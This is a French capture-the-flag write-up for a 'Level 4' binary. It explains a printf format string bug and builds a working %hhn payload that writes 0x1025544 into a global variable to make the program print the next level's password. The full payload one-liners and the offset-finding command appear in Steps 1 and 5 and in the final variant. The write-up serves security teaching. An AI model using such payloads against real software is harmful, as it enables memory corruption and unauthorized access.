# Level 4 - Format String + écriture octet par octet (`%hhn`)

## Le bug en une phrase
La fonction `p()` fait `printf(input)` au lieu de `printf("%s", input)`.
Ce qu'on tape devient donc le **format** de printf : si on met `%x`, `%n`, `%hhn`...
printf les exécute au lieu de les afficher. C'est une **format string vulnerability**.

But : écrire la valeur `0x1025544` (= **16 930 116** en décimal) dans la variable
globale `m` pour déclencher `system("/bin/cat /home/user/level5/.pass")`.


Points importants :
- `fgets(..., 0x200, ...)` limite à 512 octets → l'attaque par **buffer overflow**
  (celle des niveaux précédents) est **fermée**. On est *obligé* d'utiliser la faille
  format string.
- `m` est une **variable globale** → adresse **fixe** dans le binaire, on peut la viser.
- Au départ `m == 0`. Le programme ne modifie jamais `m` lui-même : c'est à nous de
  l'écrire via `%n`/`%hhn`.

## Les concepts à se rappeler

- `%n` / `%hhn` **écrivent** en mémoire : ils déposent **le nombre de caractères déjà
  affichés par printf** à une adresse trouvée sur la stack.
  - `%n`   → écrit sur **4 octets** (un `int` complet).
  - `%hhn` → écrit sur **1 seul octet** (le "pinceau fin").
- Notre input (`local_20c`) est posé sur la **stack**. Donc si on met des adresses au
  début de l'input, printf les retrouvera comme "arguments" et `%hhn` pourra écrire
  dedans.
- `%POS$hhn` (syntaxe positionnelle) → "écris à l'adresse trouvée à la position POS
  sur la stack", au lieu de "l'argument suivant".

## Pourquoi on n'écrit pas 16 930 116 d'un coup

`%n` écrit "le nombre de caractères affichés". Pour écrire 16 930 116 d'un seul `%n`,
il faudrait afficher **16 millions de caractères** : faisable mais énorme et sale.

À la place, on découpe `m` en **4 octets** (4 "boîtes" de 0 à 255) :

```
0x01025544  =  octets  01 02 55 44   (en little-endian dans la mémoire : 44 55 02 01)

boîte m+0  <-  0x44 = 68
boîte m+1  <-  0x55 = 85
boîte m+2  <-  0x02 = 2
boîte m+3  <-  0x01 = 1
```

Ces 4 petits nombres, **mis bout à bout en mémoire**, valent 16 930 116. On les écrit
chacun avec `%hhn` (1 octet) → on n'affiche jamais plus de ~85 caractères par boîte.

Pourquoi un petit "1" dans la 4e boîte "vaut" 16 millions ? C'est la **position**
(comme les unités/dizaines/centaines, mais en base 256) : la boîte n°4 est multipliée
par 256×256×256. Le processeur fait cette multiplication gratuitement en lisant la
mémoire ; nous on n'écrit qu'un petit "1".

(Vérif : `1*256^3 + 2*256^2 + 85*256 + 68 = 16 777 216 + 131 072 + 21 760 + 68 = 16 930 116` ✓)

## Étape 1 : trouver la position de notre input sur la stack

```bash
python -c 'print "AAAA" + " %x"*20' | ./level4
```

On cherche `41414141` (= `AAAA`, car `A` = 0x41) dans la sortie. Sa position dans la
liste = la position de notre buffer vu par printf.

→ Ici on le trouve en **position 12**.

## Étape 2 : récupérer l'adresse de `m`

Dans Ghidra (ou `objdump`), on lit l'adresse de la globale `m` :

```
m    = 0x08049810
m+1  = 0x08049811     (on ajoute 1 : la boîte/octet d'à côté)
m+2  = 0x08049812
m+3  = 0x08049813
```

En little-endian (octet de poids faible en premier), pour les poser dans le buffer :

```
m+0  ->  "\x10\x98\x04\x08"
m+1  ->  "\x11\x98\x04\x08"
m+2  ->  "\x12\x98\x04\x08"
m+3  ->  "\x13\x98\x04\x08"
```

## Étape 3 : ordonner les écritures (le piège du compteur)

Le compteur de caractères de printf **ne fait que monter** (jamais redescendre). On
doit donc écrire les octets **du plus petit au plus grand** : 1, 2, 68, 85.

De plus, les 4 adresses au début du buffer = **16 caractères** déjà affichés → le
compteur démarre à 16. On ne peut donc pas écrire "1" directement.

### Compteur géant vs boîte de 1 octet (le point clé)

Il y a **deux choses de tailles différentes** à ne pas confondre :

```
LE COMPTEUR (interne à printf)  =  un grand entier (4 octets)  ->  peut valoir 257, 324, des millions...
LA BOÎTE (où %hhn écrit)        =  1 seul octet                ->  max 255
```

`%hhn` **prend le compteur** (un grand nombre) et le **range dans 1 octet**. Mais un
octet ne tient que 0–255, donc il ne garde que `compteur % 256` (le débordement, par
tranches de 256, est perdu). C'est exactement pour ça qu'on joue avec le rebouclage :

```
compteur = 324   ->   %hhn le met dans 1 octet   ->   324 % 256 = 68   (stocké : 68)
```

(Image : verser 324 ml dans un verre de 256 ml → il ne reste que 68 ml ; ou un
odomètre dont la roue reboucle à 256.)

Donc pour écrire la valeur 1 alors que le compteur est déjà à 16, on l'amène à **257**
(= 256 + 1) : `257 % 256 = 1`. Idem pour les autres.

### Comment on construit le nombre visé (compteur cible)

Le "nombre qu'on vise" pour chaque écriture se déduit en 3 temps :

**1. Découper `m` en 4 octets** (les valeurs voulues, imposées par `m = 0x1025544`) :

```
0x1025544  ->  octets  01 02 55 44  ->  m+3=0x01=1   m+2=0x02=2   m+1=0x55=85   m+0=0x44=68
```

**2. Trier ces valeurs dans l'ordre croissant** (car le compteur ne descend jamais) :

```
1   <   2   <   68   <   85
```

**3. Pour chaque valeur, le compteur cible = `256 + valeur`.** Pourquoi `+256` ?
Parce que le compteur est déjà au-dessus de la valeur (il a démarré à 16 puis monte),
donc on ne peut pas l'amener pile sur la valeur. On ajoute **un seul tour de 256** (le
minimum pour repasser au-dessus tout en gardant le bon reste `% 256`) :

```
valeur 1   ->  cible = 256 + 1  = 257     (257 % 256 = 1)
valeur 2   ->  cible = 256 + 2  = 258     (258 % 256 = 2)
valeur 68  ->  cible = 256 + 68 = 324     (324 % 256 = 68)
valeur 85  ->  cible = 256 + 85 = 341     (341 % 256 = 85)
```

> Règle générale : `compteur_cible = 256 + octet_voulu`
> (et `caractères à ajouter = compteur_cible - compteur_actuel`, voir étape 4).

Récap complet :

```
ordre   valeur   boîte   adresse        position   compteur cible (256 + valeur)
 1er      1      m+3     \x13...         %12$hhn        257
 2e       2      m+2     \x12...         %13$hhn        258
 3e       68     m+0     \x10...         %14$hhn        324
 4e       85     m+1     \x11...         %15$hhn        341
```

Les adresses sont donc rangées dans l'ordre **\x13, \x12, \x10, \x11** (ordre des
*valeurs* croissantes, pas des adresses), et tombent aux positions 12, 13, 14, 15.

## Étape 4 : calculer le padding entre chaque `%hhn`

Le padding = des caractères bidons (`a`) qu'on affiche pour amener le compteur à la
cible juste avant chaque écriture. On ajoute seulement la **différence** :

```
avant %12$hhn :  257 - 16   = 241   ->  "a"*241   (compteur 16 -> 257,  écrit 1)
avant %13$hhn :  258 - 257  =   1   ->  "a"*1     (compteur     -> 258, écrit 2)
avant %14$hhn :  324 - 258  =  66   ->  "a"*66    (compteur     -> 324, écrit 68)
avant %15$hhn :  341 - 324  =  17   ->  "a"*17    (compteur     -> 341, écrit 85)
```

## Étape 5 : le payload final

```bash
python -c 'print "\x13\x98\x04\x08\x12\x98\x04\x08\x10\x98\x04\x08\x11\x98\x04\x08" + "a"*241 + "%12$hhn" + "a"*1 + "%13$hhn" + "a"*66 + "%14$hhn" + "a"*17 + "%15$hhn"' | ./level4
```

Décomposition :

```
"\x13...\x12...\x10...\x11..."  les 4 adresses (16 octets) -> positions 12,13,14,15
+ "a"*241  + "%12$hhn"     compteur 257  -> écrit 1  dans m+3
+ "a"*1    + "%13$hhn"     compteur 258  -> écrit 2  dans m+2
+ "a"*66   + "%14$hhn"     compteur 324  -> écrit 68 dans m+0
+ "a"*17   + "%15$hhn"     compteur 341  -> écrit 85 dans m+1
```

Résultat : `m` contient `0x01025544` → la condition `if (m == 0x1025544)` est vraie →
`system("/bin/cat /home/user/level5/.pass")` s'exécute et affiche le mot de passe.

## Pièges de syntaxe (vécus en construisant la commande)

- Les **4 adresses** = un **seul** bloc entre `"..."`, collées sans `+` entre elles,
  au **tout début** (elles doivent être contiguës pour tomber aux positions 12-15).
- Le padding = `"a"*241`, **pas** `%241` (qui ne veut rien dire).
- Il faut **un `%hhn` après chaque** padding (4 écritures), pas tous les paddings puis
  un seul `%hhn`.
- Bien **fermer chaque guillemet** : oublier le `"` final donne
  `SyntaxError: EOL while scanning string literal`.
- `%12$hhn` (avec le `$`) = position 12. Sans le `$`, `%12n` voudrait dire "largeur 12".

## Variante simple (approche "tout d'un coup", moins propre)

Comme la valeur (16M) n'est pas démesurée, on peut aussi écrire les 4 octets en une
fois avec `%n`, en affichant réellement ~16 millions de caractères (lent mais marche) :

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' | ./level4
```

(`16 930 112` = `16 930 116 - 4`, car l'adresse a déjà affiché 4 caractères.)
L'approche `%hhn` ci-dessus est préférée : rapide et générale (marche même pour des
valeurs énormes type `0xFFFFFFFF`).